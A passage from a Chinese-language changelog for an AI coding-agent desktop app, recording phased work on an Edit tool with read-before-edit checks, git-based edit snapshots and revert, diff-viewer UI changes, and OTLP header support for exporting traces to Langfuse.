  - [docs/架构.md §4.4.10](架构.md): 新增整节"ReadState Tracker（Edit 前置 + stale check，对齐 Claude Code 2.1.144）"，含 ReadState 数据结构 / 11 步 validation 表（errorCode 与 Claude Code 同号 0-12）/ Unicode escape 二态容错 / CRLF 归一化 / `old_string==""` 创建分支 / execute 阶段流程（含 FileLock + edits-worktree 快照）/ 与 Claude Code 的差异说明（无 LSP / 无 memoryWriteQueue / 不做 GrowthBook A/B）
  - [docs/架构.md §4.13](架构.md): 节标题改为"Edit Tracker & Edits Worktree"；新增"为什么叫 edits-worktree 而不是 shadow-repo"说明（独立 .git，不挂用户项目 worktrees）；目录结构里 workspace 外路径改用 `_external/<sha1(real_path)>/<basename>`
  - 全局命名：所有 shadow-repo / shadow_repo / shadowRepoStatus / ShadowRepoStatus 替换为 edits-worktree / edits_worktree / editsWorktreeStatus / EditsWorktreeStatus（架构.md + 本 changelog）
  - 全局工具引用：§4.4.2 effects / §4.4.3 RunMode / §4.4.5 PlanMode / §10 数据流 / §11 文件结构 / §16 综合对比 / §13 决策表里所有 `Write/Edit` `Edit/Write` `Edit/Write/Bash/PowerShell` 等组合统一为只列 Edit
  - [docs/架构.md §13](架构.md): 决策表追加 3 行——取消 Write 工具 / ReadState Tracker 强约束 / edits-worktree 命名取舍；原"Edit 回退机制"一行表述微调（独立 .git 而非 linked worktree）
- **影响范围**: 仅文档；不动代码、不动协议字节。Phase B 范围从"补 Edit 工具"扩为"补 Edit 工具 + 删除 Write 工具 + 新增 ReadStateTracker 模块 + agent_loop 强约束接入 + system prompt 更新（移除 Write 引用、加 Edit old_string="" 创建语义）"
- **留尾巴**:
  - hebbian 当前 `crates/agent-core/src/tools/write.rs` 还在，Phase B 删；同时 agent_loop.rs / effects.rs / dispatch.rs / context/microcompact.rs / permissions/mod.rs 里所有 `"Write"` 字面量分支同步清掉
  - `tengu_edit_minimalanchor_jrn` 在 Claude Code 是 GrowthBook A/B 开关；本设计直接走"more context" prompt 那套（更稳）。如未来希望 token-saving 模式可再追决策
  - errorCode 与 Claude Code 编号 0-12 对齐是为了未来用户搬迁 / 跨工具调试方便；如未来觉得"复用外部编号"有耦合风险可在 Phase B 实现时重新评估
  - Workspace 外路径用 `_external/<sha1(real_path)>/<basename>` 镜像；同名文件在不同目录哈希后落不同子目录，不会撞车；UI 显示一律走 metadata.real_path

### 2026-05-19 — Phase B：实现 Edit 工具 + ReadStateTracker + 删除 Write 工具 + 全量清理

- **Why**: 执行 A 段补丁的代码落地。三条线并行：(1) 补齐 Edit 工具（对齐 Claude Code 2.1.144 11 步 validation）；(2) 新增 ReadStateTracker 模块做 Read→Edit 前置约束；(3) 删除 Write 工具，所有 "Write" 字面量从代码库清掉。
- **改动**:
  - [crates/agent-core/src/tools/edit.rs](../crates/agent-core/src/tools/edit.rs): 新建 ~600 行。Edit 工具支持创建/全覆盖/局部修改三合一；11-step validation（errorCode 0-12）：old==new(1)/.ipynb(5)/1GB limit(10)/is_dir(11)/NotRead(6)/Stale(7)/string not found(8)/non-unique(9)，含 CRLF 归一化、Unicode escape 二态容错、写后更新 tracker。12 个单元测试全覆盖。
  - [crates/agent-core/src/tools/write.rs](../crates/agent-core/src/tools/write.rs): 删除。所有写入语义由 Edit 承担。
  - [crates/agent-core/src/read_state.rs](../crates/agent-core/src/read_state.rs): 新建。ReadStateTracker（session 级 HashMap，Arc 共享），ReadTool 写后 record，EditTool 执行前 precheck（NotRead/Stale/Fresh）。
  - [crates/agent-core/src/tools/read.rs](../crates/agent-core/src/tools/read.rs): 构造函数加 `tracker: Option<Arc<ReadStateTracker>>`；execute 内读完后调用 `record_read`。
  - [crates/agent-core/src/tools/mod.rs](../crates/agent-core/src/tools/mod.rs): `pub mod write` → `pub mod edit`；`default_tools` 签名加第 9 参数 `read_state_tracker`；WriteTool 替换为 EditTool；BUILTIN_TOOL_NAMES "Write" → "Edit"。
  - [crates/agent-core/src/lib.rs](../crates/agent-core/src/lib.rs): 加 `pub mod read_state;`。
  - **"Write" 字面量清理（7 个文件）**: effects.rs 工具分支 "Write"|"Edit" → "Edit"；agent_loop.rs 可中断工具列表去 "Write"；dispatch.rs 破坏性匹配去 "write"；microcompact.rs COMPACTABLE_TOOLS 去 "Write"；permissions/mod.rs 注释；definition.rs always_ask 列表 "Write" → "Edit"；tools/hitl.rs 测试。
  - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): 两处 `default_tools` 调用加 `read_state_tracker` 参数；生产路径创建 `Arc<ReadStateTracker>` 实例（per-session），预览路径传 `None`。
- **影响范围**: agent-core（tools/edit + read_state + lib + tools/mod + tools/read + 6 文件字符串清理）、desktop chat.rs 构建参数；不改协议字段、不改前端。Write 工具删除是破坏性变更——任何硬编码 "Write" 的外部调用方（如果有）会编译失败。
- **留尾巴**:
  - Edit 工具执行路径尚未包 edits-worktree 快照（架构 §4.13），由 dispatcher 在后续 Phase C/D 包夹完成
  - system prompt（架构 §9）仍可能引用 Write 工具名，需要在 Phase C 检查并更新 `BASE_SYSTEM_PROMPT`
  - Edit 的 streaming arguments 显示（前端 ToolCallDelta）留待 Phase C/D
  - edit.rs 内部 FileLock 暂未接入（架构 §4.4.10 提到但当前 session 单进程无并发风险——Phase C 补）

### 2026-05-20 — Phase C：edits-worktree 模块 + 协议事件 + dispatcher 快照集成

- **Why**: 执行架构 §4.13 的 Phase C 落地——Edit 工具执行前后拍 git 快照，支撑后续单次回退、diff 面板、修改树。三条线并行：(1) 协议层 3 新事件 + EditAction 枚举；(2) edits-worktree 模块（独立 git 仓库 + metadata 持久化）；(3) dispatcher 包夹集成 + 全链路 plumbing（SessionConfig → Session → RunParams → LoopParams → ToolDispatcher）
- **改动**:
  - [crates/protocol/src/event.rs](../crates/protocol/src/event.rs): EventPayload 新增 `EditSnapshotCreated / EditReverted / EditRevertFailed` 三个变体；新增 `EditAction { Create, Overwrite, Modify }` 枚举
  - [crates/protocol/src/lib.rs](../crates/protocol/src/lib.rs): 导出 `EditAction`
  - [crates/agent-core/src/types.rs](../crates/agent-core/src/types.rs): re-export `EditAction`
  - [crates/agent-core/src/edits/metadata.rs](../crates/agent-core/src/edits/metadata.rs): 新建。`EditEntry` 结构体 + `EditsMetadata` 文件格式（`.hebbian-edits.json`）；`load_metadata / save_metadata / find_entry / worktree_dir`；含单元测试
  - [crates/agent-core/src/edits/mod.rs](../crates/agent-core/src/edits/mod.rs): 新建。`EditsWorktree` 结构体：`enabled()` 懒检测 git、`snapshot_before/after()` 镜像+git commit、`revert()` 反向 patch + git apply、`append_entry/mark_reverted/list_entries`；路径映射（workspace 内保持相对路径 / 外走 `_external/<sha1>/<basename>`）；git 命令全部通过 `spawn_blocking` 跑以免阻塞 runtime；含单元测试
  - [crates/agent-core/src/lib.rs](../crates/agent-core/src/lib.rs): 加 `pub mod edits;`
  - [crates/agent-core/src/dispatch.rs](../crates/agent-core/src/dispatch.rs): ToolDispatcher 加 `edits_worktree: Option<Arc<EditsWorktree>>`；spawn_tool 内 Edit 工具执行前拍 `snapshot_before`、执行后拍 `snapshot_after` + 写 metadata 条目 + emit `EditSnapshotCreated`；测试调用点补字段
  - [crates/agent-core/src/agent_loop.rs](../crates/agent-core/src/agent_loop.rs): LoopParams 加 `edits_worktree` 字段；run_loop 析构 + ToolDispatcher 构造链补该字段；3 个测试 LoopParams 构造点补 `None`
  - [crates/agent-core/src/harness.rs](../crates/agent-core/src/harness.rs): RunParams 加 `edits_worktree` 字段；spawn_run 析构 + LoopParams 构造链补该字段
  - [crates/agent-core/src/session.rs](../crates/agent-core/src/session.rs): SessionConfig + Session struct 加 `edits_worktree` 字段；Session::new() / run() / resume_with_runtime_inputs() 全链路传递
  - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): import EditsWorktree；创建 `Arc<EditsWorktree>` per-session（data_dir + session_id + workspace）；SessionConfig 加 `edits_worktree: Some(...)` 传入
- **影响范围**: protocol（3 新事件 + 1 枚举）、agent-core（edits 模块 + dispatch 包夹集成）、desktop chat.rs（构建参数 + SessionConfig）；不改前端、不改 Tauri command。新事件自动进入 recorder jsonl（sink 已全局挂钩）
- **留尾巴**:
  - revert 路径仅在 EditsWorktree 模块内有接口，尚未接 Tauri command（Phase D：`list_edits / diff_edit / revert_edit / edits_worktree_status` 四个同步 API）
  - edits-worktree 的 FileLock 尚未接入（架构 §4.13.4 要求按真实文件路径加排他锁）；当前单 session 单 run 无并发风险
  - 前端 EditSnapshotCreated 事件订阅 + 修改树卡片渲染（Phase E）
  - Edit 工具的 `action` 判定较简略（现仅按 old_string 是否为空判断 Create vs Modify）；未区分 Overwrite；Phase D 可完善
  - `edits_worktree_ttl_days` 配置项 + 后台清理任务未实现（架构 §4.13.12）
  - 无 git 时 `editsWorktreeStatus.enabled=false` 通知前端的通道尚未建立（Phase D Tauri command + Phase E toast UI）

### 2026-05-20 — Phase D：edits-worktree Tauri 命令 + EngineEvent 翻译 + TypeScript 类型

- **Why**: 把 edits-worktree 模块的能力暴露给前端——4 个 Tauri 命令让 UI 能查询、对比、回退 Edit 快照；3 个 EngineEvent 变体让实时快照创建/回退结果推送到前端。
- **改动**:
  - [apps/desktop/src/engine/mod.rs](../apps/desktop/src/engine/mod.rs): EngineEvent 新增 `EditSnapshotCreated / EditReverted / EditRevertFailed` 三个变体
  - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): `agent_event_to_engine_event` 新增 3 个 match 分支翻译 edit 事件
  - [crates/agent-core/src/edits/mod.rs](../crates/agent-core/src/edits/mod.rs): 新增 `get_file_at_sha()` 和 `diff_text()` 两个公开方法，供 Tauri 命令使用
  - [apps/desktop/src/lib.rs](../apps/desktop/src/lib.rs):
    - 新增 `list_edits / diff_edit / revert_edit / edits_worktree_status` 4 个 Tauri 命令
    - 新增 `DiffPayload / RevertResult / EditsWorktreeStatus` 3 个 DTO
    - 新增 `build_edits_worktree()` 辅助函数，从 session + settings 构造 EditsWorktree
    - `generate_handler![]` 注册 4 新命令
    - 导入 `agent_core::edits` / `agent_core::edits::metadata::EditEntry` / `agent_core::workspace::Workspace`
  - [apps/desktop/frontend/src/desktop/ui/types.ts](../apps/desktop/frontend/src/desktop/ui/types.ts):
    - EngineEvent 联合类型新增 3 个变体（`edit_snapshot_created / edit_reverted / edit_revert_failed`）
    - 新增 `EditAction / EditEntry / DiffPayload / RevertResult / EditsWorktreeStatus` 接口
- **影响范围**: desktop crate（lib.rs + engine/mod.rs + chat.rs + types.ts）、agent-core（edits/mod.rs 2 新公开方法）；不改协议字段、不改 storage 格式
- **留尾巴**:
  - 前端 EditSnapshotCreated 事件订阅 + EditTree 浮动卡片渲染（Phase E）
  - 前端 diff 面板（DiffPanel 三态 inline/split/fullscreen）+ revert 按钮 UI（Phase E）
  - revert_edit 命令目前仅操作 edits-worktree 层面，未通过 Tauri 事件广播 `edit_reverted` 给前端（revert 成功时 lib.rs 未持有 event sink——Phase E 需解决：revert 完从 ToolDispatcher 再包一次？或在 Tauri command 里主动 emit 到 window）
  - EditsWorktree 跨 session 并发 FileLock 未接入（架构 §4.13.4）

### 2026-05-20 — Phase E：前端 EditTreePanel + DiffPanel + 事件订阅 + revert 交互

- **Why**: 把 edits-worktree 的后端能力完整暴露为前端 UI——Edit 修改树浮动卡片、差异对比面板、回退按钮、实时事件订阅。用户可在对话中看到每次 Edit 操作的记录，对比修改前后内容，并一键回退。
- **改动**:
  - [apps/desktop/frontend/src/desktop/bridge/tauri.ts](../apps/desktop/frontend/src/desktop/bridge/tauri.ts): 新增 `listEdits / diffEdit / revertEdit / editsWorktreeStatus` 4 个 IPC 调用
  - [apps/desktop/frontend/src/desktop/ui/store/useStore.ts](../apps/desktop/frontend/src/desktop/ui/store/useStore.ts):
    - `SessionStream` 类型新增 `editSnapshots: EditEntry[]` 字段
    - `applyEventToSlot()` 新增 3 个分支处理 `edit_snapshot_created / edit_reverted / edit_revert_failed`
    - 新增 `revertEdit()` 和 `refreshEdits()` 两个 action
    - `openSession()` 末尾调用 `refreshEdits()` 加载已有快照
    - 镜像字段 + EMPTY_MIRROR + 初始状态同步新增 `editSnapshots`
  - [apps/desktop/frontend/src/desktop/ui/components/EditTreePanel.tsx](../apps/desktop/frontend/src/desktop/ui/components/EditTreePanel.tsx): 新建。浮动卡片（`absolute right-4 top-[150px] z-30`），支持折叠药丸 / 展开面板；按文件路径分组展示 EditEntry 列表，每项显示 action 图标、文件路径片段、字节变化、时间戳；提供回退按钮和「对比」按钮
  - [apps/desktop/frontend/src/desktop/ui/components/DiffPanel.tsx](../apps/desktop/frontend/src/desktop/ui/components/DiffPanel.tsx): 新建。差异对比面板，支持 inline / split / fullscreen 三种模式切换；split 模式左右分栏对比，inline 模式上下排列；删除行红色背景、新增行绿色背景、修改行琥珀色背景；集成 `api.diffEdit()` 获取 before/after 文本
  - [apps/desktop/frontend/src/desktop/ui/components/ChatView.tsx](../apps/desktop/frontend/src/desktop/ui/components/ChatView.tsx): 在 `BackgroundTaskPanel` 之后、消息列表之前插入 `<EditTreePanel />`
- **影响范围**: 仅前端（tauri.ts + useStore.ts + ChatView.tsx + 2 新组件）；Rust 后端无变化
- **留尾巴**:
  - 简单逐行比较不考虑行移位（真正的 Myers diff 算法），对于大段代码重排/缩进变更不够准确
  - EditTree panel 目前只展示 streaming 中累积的快照；session reload 后会从后端全量 refresh，但 streaming 期间的 `editSnapshots` 事件携带的 `before_sha`/`after_sha` 为空字符串（`edit_snapshot_created` EngineEvent 字段限制），点「对比」前需要 refreshEdits 拿完整 entry
  - 无 git 时的 toast 警告未实现——需在 `edits_worktree_status` 返回 `enabled=false` 时弹出（当前仅在 `edit_revert_failed` 事件 + revert Tauri command 失败时能看到错误提示）
  - DiffPanel fullscreen 模式下按 Escape 关闭未实现

### 2026-05-20 — Phase F：完善 edits-worktree 全链路（sha 字段 / 文件锁 / 全局事件 / LCS diff / 非阻塞面板 / 提示清理）

- **Why**: Phase E 留下了 11 个待修复项——sha 字段不流通导致「对比」需先 refresh、diff 算法简陋、DiffPanel 阻塞聊天交互、无 Escape 键、无 git 不可用提示、revert 不广播全局事件、EditsWorktree 无文件锁、系统提示残留 Write 引用、TTL 未配置、类型重复无维护说明。
- **改动**:
  - sha 字段补全（pipeline 端到端通过）：
    - [crates/protocol/src/event.rs](../crates/protocol/src/event.rs): `EventPayload::EditSnapshotCreated` 已有 `before_sha`/`after_sha`（Phase D 已加）
    - [crates/agent-core/src/dispatch.rs](../crates/agent-core/src/dispatch.rs): `after.sha` clone 修复，避免 move 后重复使用
    - [apps/desktop/src/engine/mod.rs](../apps/desktop/src/engine/mod.rs): `EngineEvent::EditSnapshotCreated` 已有 `before_sha`/`after_sha`（Phase D 已加）
    - [apps/desktop/frontend/src/desktop/ui/types.ts](../apps/desktop/frontend/src/desktop/ui/types.ts): `edit_snapshot_created` 变体新增 `before_sha`/`after_sha` 字段
    - [apps/desktop/frontend/src/desktop/ui/store/useStore.ts](../apps/desktop/frontend/src/desktop/ui/store/useStore.ts): `applyEventToSlot` 改用 `e.before_sha`/`e.after_sha` 替代硬编码空字符串
  - DiffPanel 三项改进：
    - [apps/desktop/frontend/src/desktop/ui/components/DiffPanel.tsx](../apps/desktop/frontend/src/desktop/ui/components/DiffPanel.tsx): 
      - 实现 LCS-based diff 算法（`computeDiff`），正确处理行移位/插入/删除，替代原先逐行对齐的比较
      - inline 模式下 before/after 区域各只显示相关行（remove 行只出现在 before，add 行只出现在 after）
      - split 模式下左右两侧行号独立计数，空行用占位保持对齐
      - 非全屏模式改为非阻塞浮动面板（`pointer-events-none` 外层 + `pointer-events-auto` 卡片），聊天可后台交互
      - 全局 Escape 键：全屏模式退回分栏，非全屏直接关闭
  - Git 不可用提示：
    - [apps/desktop/frontend/src/desktop/ui/components/EditTreePanel.tsx](../apps/desktop/frontend/src/desktop/ui/components/EditTreePanel.tsx): 初始化时调 `editsWorktreeStatus`，git 不可用且无已有快照时弹出 toast 警告
  - revert 全局事件广播（跨窗口同步）：
    - [apps/desktop/src/lib.rs](../apps/desktop/src/lib.rs): `revert_edit` 成功时 `app.emit("edit-reverted", payload)`
    - [apps/desktop/frontend/src/App.tsx](../apps/desktop/frontend/src/App.tsx): 新增 `edit-reverted` 全局事件监听，前台窗口自动调 `refreshEdits()`
  - EditAction 检测改进（Overwrite 判定）：
    - [crates/agent-core/src/dispatch.rs](../crates/agent-core/src/dispatch.rs): `old_string.len() >= before_bytes - 10` 时判定为 Overwrite（Phase F 修复前仅区分 Create/Modify）
  - FileLock 集成（架构 §4.13.4）：
    - [crates/agent-core/src/edits/mod.rs](../crates/agent-core/src/edits/mod.rs): 新增 `FileLockGuard` 结构（Drop 时自动 `fs2::unlock`）+ `lock_file()` 公开方法，lock 文件路径 `<worktree>/.locks/<hash(real_path)>.lock`
    - [crates/agent-core/src/dispatch.rs](../crates/agent-core/src/dispatch.rs): Edit 工具派发前获取 `_edit_lock`，贯穿 snapshot_before + execute + snapshot_after 全程，确保同文件不被并发 Edit 打断
  - 系统提示清理：
    - [crates/agent-core/prompts/base_system.md](../crates/agent-core/prompts/base_system.md): 3 处 `Write` → `Edit`（工具选择指南 + 写前先读规则 + AskBeforeEdits 模式说明）
  - 类型同步维护说明：
    - [apps/desktop/src/engine/mod.rs](../apps/desktop/src/engine/mod.rs): 新增 doc comment 说明与 types.ts EngineEvent 的双向同步关系
    - [apps/desktop/frontend/src/desktop/ui/types.ts](../apps/desktop/frontend/src/desktop/ui/types.ts): 新增 JSDoc 列出 4 处需同步更新的位置
  - TTL 配置字段（架构 §4.13.12）：
    - [crates/agent-core/src/storage/settings.rs](../crates/agent-core/src/storage/settings.rs): `ConversationDefaults` 新增 `edits_worktree_ttl_days: u32`（默认 30 天），后台清理任务待后续实现
- **影响范围**: protocol（无字段变更，仅修复 clone 语义）、agent-core（edits + dispatch + settings）、desktop（lib.rs + engine/mod.rs + chat.rs）、前端（types.ts + useStore.ts + App.tsx + DiffPanel + EditTreePanel + types.ts 维护注释）；不破坏兼容
- **留尾巴**:
  - 后台 TTL 清理任务未实现（`edits_worktree_ttl_days` 字段已就位，清理逻辑待加：扫描过期 session → 删 worktree → 标灰 metadata）
  - `revert_edit` 自己未对真实文件加 FileLock（当前锁只保护 snapshot 流程；revert 的 git apply → copy 回真实文件的原子性由 git apply --check 保证冲突检测）
  - 大文件 diff（>10K 行）的 LCS DP 表 O(n*m) 可能有性能压力——可后续加阈值切换到启发式算法

### 2026-05-20 — Edit/Write 工具流式 diff + 审批弹窗 diff 视图 + 三态共用 DiffViewer

- **Why**: 用户痛点：（1）Edit 工具流式输出 args 时 desktop 端只显示空 result，看不到模型正在写什么；（2）Edit/Write 工具卡片展开后是原始 result 文本，缺少 diff 视图；（3）需要审批的 Edit/Write 在 PermissionApprovalPopup 里渲染的是 `JSON.stringify(input)`，不直观。架构.md §4.13.8 / §4.13.9 早就定义了三态共用 DiffViewer + inline/split 切换 + 放大模态，但只落到 detail 态。本次补齐 streaming + approval 两态。
- **改动**:
  - [apps/desktop/frontend/src/desktop/ui/components/DiffPanel.tsx](../apps/desktop/frontend/src/desktop/ui/components/DiffPanel.tsx): 拆分出纯渲染 `<DiffViewer>` 组件，参数 `beforeText / afterText / mode / streaming / filePath / actionLabel / badge / rightExtras / onCycleMode / onClose`；流式时 after 末尾渲一个脉动光标占位；inline / split / fullscreen 三模式共用，由父组件受控。`DiffPanel` 退化为 detail 态浮层包装（拉 `api.diffEdit` 后喂给 DiffViewer）。
  - [apps/desktop/frontend/src/desktop/ui/lib/parsePartialEditArgs.ts](../apps/desktop/frontend/src/desktop/ui/lib/parsePartialEditArgs.ts): 新增容错 JSON 流式解析器。手写状态机扫顶层对象的 `file_path / old_string / new_string / content` 字符串字段；遇到未闭合的 `"..."` 也能把已收的部分（包含转义还原）吐出来给 UI 渲。同时导出 `diffSidesFromArgs(toolName, args) → { beforeText, afterText }`（Edit: old/new；Write: ""/content）和 `inferDiffAction(toolName, args)`。
  - [apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx](../apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx): Edit/Write 工具的卡片详情改用新增的 `<EditDiffDetail>` 组件——按 `editSnapshots.find(call_id)` 决定走 detail（`api.diffEdit` 拉权威 before/after）还是 streaming（直接渲 args）。状态徽标显示「实时预览 / 执行中 / 加载权威 diff… / 权威 diff 加载失败」。inline ↔ split 切换 + 放大 fullscreen 全在卡片内，Esc 退回 split。删除原本的 `WriteHeader` + 双 ToolPre 渲染。
  - [apps/desktop/frontend/src/desktop/ui/components/PermissionApprovalPopup.tsx](../apps/desktop/frontend/src/desktop/ui/components/PermissionApprovalPopup.tsx): 当 `kind == tool_call && toolName ∈ {Edit, Write}` 时，把原始 JSON 预览换成新增的 `<ApprovalEditDiff>` 子组件，走同一个 `parsePartialEditArgs` + `<DiffViewer>`；徽标显示「待审批」。其它工具保持原 JSON 预览。
  - [docs/架构.md](架构.md): §4.13.7 移除 `hunks` 字段，改为只给 `before_text / after_text` + 加一段"hunks 在前端算"的说明；§4.13.8 重写流式策略——明确"diff 两端直接来自 args 本身，不读磁盘"（Edit: old_string / new_string；Write: "" / content），并加"为什么 streaming 态不读磁盘"的取舍解释；§4.13.9 三态表数据源改成 `parsePartialEditArgs(arguments)` / detail 用 `diffEdit`。§13 决策表追加两条："流式 diff 两端来源" + "DiffPayload hunks"。
- **影响范围**: desktop 前端（DiffPanel / MessageBubble / PermissionApprovalPopup + 新 lib 文件）+ 架构文档；**协议零变更**（复用现有 `ToolCallDelta { arguments_delta }`）；Rust 端零改动。EditEntry / DiffPayload 后端类型不动。视觉变化：Edit/Write 工具卡片展开后改为 diff 视图（之前是 result 文本框），审批弹窗 Edit/Write 改为 diff 视图（之前是 JSON）。
- **留尾巴**:
  - streaming 态展示的是局部 diff（只看 old/new），切到 detail 时画面会变成完整文件 diff（包含未改动上下文）——这是有意的语义切换，但用户可能短暂感到画面"跳"。后续可考虑 detail 态默认折叠相同行（只显示带 ±N 行上下文的 hunks）来缩小这个跳变。
  - DiffViewer 没把 LCS DP 表加大文件阈值；上一版 changelog 已留过同一个尾巴，未在本次解决。
  - `inferDiffAction` 在 Edit 工具流式阶段把"old_string 还没收"和"old_string 真的是空串"都判成 `create`，等流式收完会自动校正；与后端 EditAction 落盘语义对齐，无副作用。

### 2026-05-20 — DiffViewer 三处体验补丁：行折行对齐 / 流式默认展开 / 放大改为 chat 区域内

- **Why**: 上一条落地后用户实际试用反馈：（1）流式过来时虽然 diff 已经能渲，但工具卡片默认折叠，用户得点开才看见，等点开模型已经写完了——看不到"流"的感觉；（2）长行 break-all 后第二行直接顶到行号位置，视觉上文本和行号混在一起；（3）"放大"是 `fixed inset-0` 占满整个 window，连 sidebar 都盖住了，用户希望只占 chat 区域并留一点 padding。
- **改动**:
  - 流式默认展开：[apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx](../apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx) `MessageBubble` 新增 `autoExpandedRef`，监听 `streamingParts` 中首次出现的 Edit/Write tool_call → 自动加入 `expandedToolCalls`。用 ref 去重避免重复触发，因此用户主动折叠后不会被强行展回。
  - 行折行对齐：[apps/desktop/frontend/src/desktop/ui/components/DiffPanel.tsx](../apps/desktop/frontend/src/desktop/ui/components/DiffPanel.tsx) 抽 `<DiffLine>` 子组件，把"行号 + 文本"从 inline-block 改成 flex 布局：行号 `shrink-0 w-8`，文本 `min-w-0 flex-1 whitespace-pre-wrap break-all`——这样长行换行只在文本子元素内换，第二行自然缩进到第一行文本起点，不会回到行号位置。`InlineDiff` / `SplitDiff` 全部走 `<DiffLine>`，删除两份重复的行渲染代码。`tabular-nums` 让行号等宽对齐。
  - Fullscreen 改为 chat 区域 portal：
    - [apps/desktop/frontend/src/desktop/ui/components/ChatView.tsx](../apps/desktop/frontend/src/desktop/ui/components/ChatView.tsx): 根 div 末尾加 `<div id="chat-fullscreen-anchor" className="pointer-events-none absolute inset-0 z-[60]" />` 作为 portal 锚点。ChatView 自身已是 `relative`，所以锚点正好覆盖 chat 区域不挡 sidebar。
    - [apps/desktop/frontend/src/desktop/ui/components/DiffPanel.tsx](../apps/desktop/frontend/src/desktop/ui/components/DiffPanel.tsx): 导出 `<FullscreenPortal>` 包装组件——用 `React.createPortal` 渲到 `#chat-fullscreen-anchor`（找不到时回退到 `document.body`）；放大内容用 `absolute inset-3` 撑满锚点并留 12px padding，外加 `rounded-xl border shadow-2xl` 做卡片样式。`pointer-events-auto` 只开在内容卡片上。
    - 三处 fullscreen 全部走同一个 portal：`DiffPanel`（修改树点开的浮层放大）、`EditDiffDetail`（消息卡片放大）、`ApprovalEditDiff`（审批弹窗放大）。
- **影响范围**: desktop frontend（ChatView / DiffPanel / MessageBubble / PermissionApprovalPopup）；零协议变更、零 Rust 改动。视觉变化：（a）流式 Edit/Write 工具卡片首次出现立刻展开；（b）所有 diff 行长行换行第二行起从文本起点缩进；（c）放大模式占 chat 区域而非整个 window，sidebar 仍可见。
- **留尾巴**:
  - "首次自动展开"的 ref 是 MessageBubble 实例级——用户切换会话后重新创建 MessageBubble，新会话的流式 Edit 又会自动展开一次。这是有意的行为（每个会话独立"提示一次"），但如果将来想做"全局只提示一次"需要把 ref 提到上层。
  - 修改树面板里的 `DiffPanel` 浮层（非全屏态）仍用 `fixed inset-0` 包裹，没有跟着改成 portal——它本来就是非阻塞浮层，背景透传，影响较小。后续如果要让浮层也只占 chat 区域，再做一次 portal 化迁移。

### 2026-05-20 — observability 支持 OTLP 自定义 headers + 可关 metric，打通 Langfuse 接入

- **Why**: 用户要把现有 OTLP 流量直接灌到 Langfuse Cloud（jp 区）。Langfuse 走 OTLP/HTTP，但用 Basic Auth（`Authorization=Basic base64(pk:sk)`），而原先 `observability::init` 只配了 endpoint + protocol，没给 SpanExporter 喂 headers，于是认证根本带不上。同时 Langfuse 不消费 metrics，metric exporter 默认开着会让 `/v1/metrics` 一路打 404 噪音。
- **改动**:
  - [crates/observability/src/lib.rs](../crates/observability/src/lib.rs): 新增 `parse_otlp_headers()` 读取 OTel 标准变量 `OTEL_EXPORTER_OTLP_HEADERS`（`k1=v1,k2=v2`），分别喂给 `SpanExporter::builder().with_headers()` 和 `MetricExporter::builder().with_headers()`；新增 `HEBBIAN_OTEL_METRICS=0/false/off` 开关让 metric 导出可单独关掉（关闭时 `OtelGuard.meter_provider = None`，全局 meter provider 不被覆盖，保持 no-op 默认实现）；模块顶 doc 补充环境变量小节
  - [docs/架构.md](架构.md) §4.10.1: 补充 `OTEL_EXPORTER_OTLP_HEADERS` 用法、Langfuse Cloud endpoint 形态、`HEBBIAN_OTEL_METRICS` 开关
- **影响范围**: 仅 `crates/observability`，对外行为只新增 2 个环境变量识别；attr.rs 的 GenAI semconv 命名本就和 Langfuse 对齐，无需联动；不破坏既有 collector（Tempo/Jaeger/Grafana）用法——不设 headers 即沿用旧行为
- **接入操作（不入仓）**:
  ```bash
  export LANGFUSE_PK=pk-lf-...
  export LANGFUSE_SK=sk-lf-...
  export OTEL_EXPORTER_OTLP_ENDPOINT=https://jp.cloud.langfuse.com/api/public/otel
  export OTEL_EXPORTER_OTLP_HEADERS="Authorization=Basic $(printf '%s:%s' "$LANGFUSE_PK" "$LANGFUSE_SK" | base64)"
  export HEBBIAN_OTEL_METRICS=0
  pnpm tauri dev
  ```
- **留尾巴**:
  - Header 解析按 OTel spec 「逗号分隔 + 第一个 `=` 切 key/value」实现，未做 URL-decode；如果以后要塞含逗号 / 等号的复杂 value，再补一层 percent-decode 即可。Basic Auth base64 不含这两类字符，当前足够。
  - Langfuse 只看 OTel resource 的 `service.name` 区分来源，目前 desktop 注入的是 `hebbian-desktop` / cli 是 `hebbian-cli`，需要进一步按环境（dev/staging/prod）区分时，可考虑加 `deployment.environment` resource 属性

### 2026-05-20 — 修正 fullscreen 锚点位置 + ExpandButton 统一走 chat 区域 portal + 文档定义 chat 区域

- **Why**: 上一条把 `#chat-fullscreen-anchor` 放在 ChatView 根（`absolute inset-0`），结果盖到了标题栏和输入框——"chat 区域"实际是消息列表那一块（header 下、input 上）。用户同时要求：其他放大预览（工具卡片 ExpandButton）也走同一区域；并在架构.md 写明 chat 区域定义，免得后续 agent 又把它理解错。
- **改动**:
  - [apps/desktop/frontend/src/desktop/ui/components/ChatView.tsx](../apps/desktop/frontend/src/desktop/ui/components/ChatView.tsx): 给消息列表 scrollRef 包一层 `<div className="relative flex-1 min-h-0">`，scrollRef 从 `flex-1 overflow-y-auto` 改成 `absolute inset-0 overflow-y-auto`（依赖新父容器的 relative + min-h-0 撑满）；`#chat-fullscreen-anchor` 移到这个新父容器内做兄弟元素——这样锚点完全覆盖消息列表区域，不挡 header / input / sidebar。删除根 div 末尾原本错位的锚点。
  - [apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx](../apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx) `ExpandButton`: 工具卡片放大原本是 `fixed inset-0` 全屏 + `flex items-center justify-center` 居中 modal，改用 `<FullscreenPortal>` 渲到 chat 锚点；内层 `absolute inset-3` 撑满 + 12px padding + `rounded-xl shadow-2xl`。新增 `bg-foreground/30` 透明 backdrop 接收"点外面关闭"（之前依靠外层 div onClick，现在 portal 锚点 pointer-events-none 要单独加），同时挂 Escape 监听让 Esc 也能关。
  - 三处 DiffViewer fullscreen（[DiffPanel](../apps/desktop/frontend/src/desktop/ui/components/DiffPanel.tsx) / [MessageBubble EditDiffDetail](../apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx) / [PermissionApprovalPopup ApprovalEditDiff](../apps/desktop/frontend/src/desktop/ui/components/PermissionApprovalPopup.tsx)）也同步加 backdrop，体验对齐 ExpandButton。
